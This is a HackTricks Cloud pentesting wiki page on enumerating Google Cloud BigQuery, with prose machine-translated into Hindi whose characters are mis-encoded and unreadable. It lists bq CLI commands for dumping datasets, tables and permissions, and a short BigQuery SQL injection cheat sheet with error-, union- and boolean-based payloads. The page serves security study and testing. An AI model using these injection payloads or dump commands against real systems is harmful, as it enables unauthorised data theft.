# GCP - Bigquery Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Google Cloud BigQuery рдПрдХ **рдкреВрд░реНрдг-рдкреНрд░рдмрдВрдзрд┐рдд, рд╕рд░реНрд╡рд░ рд░рд╣рд┐рдд рдЙрджреНрдпрдо рдбреЗрдЯрд╛ рд╡реЗрдпрд░рд╣рд╛рдЙрд╕** рд╣реИ, рдЬреЛ **рдкреЗрдЯрд╛рдмрд╛рдЗрдЯреНрд╕** рдХреЗ рдбреЗрдЯрд╛ рдкрд░ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХреА рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрдбрд╝реЗ рдкреИрдорд╛рдиреЗ рдкрд░ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдХреЛ рдХреБрд╢рд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИред рдПрдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрд╡рд╛ (PaaS) рдХреЗ рд░реВрдк рдореЗрдВ, рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбреЗрдЯрд╛ рдкреНрд░рдмрдВрдзрди рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдБрдЪрд╛ рдФрд░ рдЙрдкрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдореИрдиреБрдЕрд▓ рджреЗрдЦрд░реЗрдЦ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

рдпрд╣ **ANSI SQL** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рд╡рд╕реНрддреБрдПрдБ **рдбреЗрдЯрд╛рд╕реЗрдЯ** рд╣реИрдВ рдЬрд┐рдирдореЗрдВ **рдЯреЗрдмрд▓** рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ SQL **рдбреЗрдЯрд╛** рд╣реЛрддрд╛ рд╣реИред

### Encryption

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдХ **Google-рдкреНрд░рдмрдВрдзрд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд╣рд╛рд▓рд╛рдВрдХрд┐ рдПрдХ **рдЧреНрд░рд╛рд╣рдХ-рдкреНрд░рдмрдВрдзрд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА (CMEK)** рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдФрд░ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЯреЗрдмрд▓ рдХреЗ рд▓рд┐рдП рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### Expiration

рдпрд╣ **рдбреЗрдЯрд╛рд╕реЗрдЯ рдореЗрдВ рдПрдХ рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдореЗрдВ рдмрдирд╛рдИ рдЧрдИ рдХреЛрдИ рднреА рдирдИ рдЯреЗрдмрд▓ **рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рдВрдЦреНрдпрд╛ рдХреЗ рджрд┐рдиреЛрдВ** рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рд╣рдЯрд╛рдИ** рдЬрд╛рдПрдЧреАред

### External Sources

Bigquery рдЕрдиреНрдп Google рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЧрд╣рд░рд╛рдИ рд╕реЗ рдПрдХреАрдХреГрдд рд╣реИред рдпрд╣ рдмрдХреЗрдЯ, рдкрдм/рд╕рдм, рдЧреВрдЧрд▓ рдбреНрд░рд╛рдЗрд╡, RDS рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ...

### Dataset ACLs

рдЬрдм рдПрдХ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ **ACLs рд╕рдВрд▓рдЧреНрди** рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрд╕ рдкрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **рд╕реНрд╡рд╛рдореА** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдиреЗ рдбреЗрдЯрд╛ рд╕реЗрдЯ рдмрдирд╛рдпрд╛ рдФрд░ рдлрд┐рд░ **рд╕реНрд╡рд╛рдореА** рдХреЛ рд╕рдореВрд╣ **projectOwners** (рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдорд╛рд▓рд┐рдХ), **рд▓реЗрдЦрдХ** рдХреЛ рд╕рдореВрд╣ **projectWriters,** рдФрд░ **рдкрд╛рдардХ** рдХреЛ рд╕рдореВрд╣ **projectReaders**:
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### Table Rows Control Access

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рджреНрд╡рд╛рд░рд╛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП** рдкрдВрдХреНрддрд┐ рдкрд╣реБрдВрдЪ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рдеред рдпреЗ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create_row_access_policy_statement) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред\
рдкрд╣реБрдВрдЪ рдиреАрддрд┐ рдПрдХ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИ рдФрд░ **рдХреЗрд╡рд▓ рдорд┐рд▓рддреА-рдЬреБрд▓рддреА рдкрдВрдХреНрддрд┐рдпрд╛рдБ** рдЙрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рд╕рд╛рде **рдЙрдкрд▓рдмреНрдз** рд╣реЛрдВрдЧреА рдЬреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реЛрдВ рджреНрд╡рд╛рд░рд╛ред
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### Columns Access Control

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

рдХреЙрд▓рдо рд╕реНрддрд░ рдкрд░ рдбреЗрдЯрд╛ рдПрдХреНрд╕реЗрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

1. **рдПрдХ рд╡рд░реНрдЧреАрдХрд░рдг рдФрд░ рдиреАрддрд┐ рдЯреИрдЧ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░реЗрдВ**ред рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЧреАрдХрд░рдг рдФрд░ рдиреАрддрд┐ рдЯреИрдЧ рдмрдирд╛рдПрдВ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВред [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. рд╡реИрдХрд▓реНрдкрд┐рдХ: **рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рдиреАрддрд┐ рдЯреИрдЧ рдкрд░ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдбреЗрдЯрд╛ рдХреИрдЯрд▓реЙрдЧ рдлрд╛рдЗрди-рдЧреНрд░реЗрди рд░реАрдбрд░ рднреВрдорд┐рдХрд╛ рджреЗрдВ**ред
3. **рдЕрдкрдиреЗ BigQuery рдХреЙрд▓рдо рдореЗрдВ рдиреАрддрд┐ рдЯреИрдЧ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдВ**ред BigQuery рдореЗрдВ, рдЙрди рдХреЙрд▓рдореЛрдВ рдореЗрдВ рдиреАрддрд┐ рдЯреИрдЧ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреАрдорд╛ рдПрдиреЛрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред
4. **рд╡рд░реНрдЧреАрдХрд░рдг рдкрд░ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░реЗрдВ**ред рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░рдиреЗ рд╕реЗ рд╡рд░реНрдЧреАрдХрд░рдг рдореЗрдВ рд╕рднреА рдиреАрддрд┐ рдЯреИрдЧ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рднрд╛рд╖рд┐рдд рдПрдХреНрд╕реЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рд▓рд╛рдЧреВ рд╣реЛрддреЗ рд╣реИрдВред
5. **рдиреАрддрд┐ рдЯреИрдЧ рдкрд░ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВ**ред рдкреНрд░рддреНрдпреЗрдХ рдиреАрддрд┐ рдЯреИрдЧ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [Identity and Access Management](https://cloud.google.com/iam) (IAM) рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдиреАрддрд┐ рдЙрд╕ рдкреНрд░рддреНрдпреЗрдХ рдХреЙрд▓рдо рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рд╣реИ рдЬреЛ рдиреАрддрд┐ рдЯреИрдЧ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд╡реЗрд░реА рд╕рдордп рдкрд░ рдХреЙрд▓рдо рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рддреЛ BigQuery **рдХреЙрд▓рдо рдиреАрддрд┐ рдЯреИрдЧ рдФрд░ рдЗрд╕рдХреА рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ**ред

{% hint style="success" %}
рд╕рд╛рд░рд╛рдВрд╢ рдХреЗ рд░реВрдк рдореЗрдВ, рдХреБрдЫ рдХреЙрд▓рдореЛрдВ рддрдХ рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **рд╕реНрдХреАрдорд╛ рдореЗрдВ рдХреЙрд▓рдо рдкрд░ рдПрдХ рдЯреИрдЧ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЯреИрдЧ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЯреИрдЧ рдХреЗ рд╡рд░реНрдЧреАрдХрд░рдг рдкрд░ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реБрдП**ред
{% endhint %}

рд╡рд░реНрдЧреАрдХрд░рдг рдкрд░ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдХреЙрд▓рдо рдХреЗ рдЯреИрдЧ рджреЗрдЦ рд╕рдХреЗрдВ:

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### Enumeration

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQL Injection

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЖрдк рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). рдпрд╣рд╛рдБ рдХреЗрд╡рд▓ рдХреБрдЫ рд╡рд┐рд╡рд░рдг рджрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

**Comments**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдПрдХ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛
* `select 1--from here it is not working`

**environment** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **information** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдЬреИрд╕реЗ:

* рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛: `select session_user()`
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЖрдИрдбреА: `select @@project_id`

рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ:

* рд╕рднреА рддрд╛рд▓рд┐рдХрд╛ рдирд╛рдо: `string_agg(table_name, ', ')`

**datasets**, **tables** рдФрд░ **column** рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

* **Project** рдФрд░ **dataset** рдирд╛рдо:

{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **рдбреЗрдЯрд╛рд╕реЗрдЯ** рдХреЗ **рд╕рднреА рддрд╛рд▓рд┐рдХрд╛рдУрдВ** рдХреЗ **рд╕реНрддрдВрдн** рдФрд░ **рддрд╛рд▓рд┐рдХрд╛** рдирд╛рдо:

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **рдПрдХ рд╣реА рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдЕрдиреНрдп рдбреЗрдЯрд╛рд╕реЗрдЯ:**

{% code overflow="wrap" %}
```sql
#┬аSELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQL Injection рдкреНрд░рдХрд╛рд░:**

* рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд - рдХрд╛рд╕реНрдЯрд┐рдВрдЧ: `select CAST(@@project_id AS INT64)`
* рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд - рд╢реВрдиреНрдп рджреНрд╡рд╛рд░рд╛ рд╡рд┐рднрд╛рдЬрди: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд (рдЖрдкрдХреЛ bigquery рдореЗрдВ ALL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* рдмреВрд▓рд┐рдпрди рдЖрдзрд╛рд░рд┐рдд: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдордп рдЖрдзрд╛рд░рд┐рдд - рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдбреЗрдЯрд╛рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрджрд╛рд╣рд░рдг: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг:**

* рд╕рднреА рдлрд╝рдВрдХреНрд╢рди рд╕реВрдЪреА: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдФрд░ рдкреЛрд╕реНрдЯ рд╢реЛрд╖рдг

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### рд╕реНрдерд┐рд░рддрд╛

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>
{% endhint %}
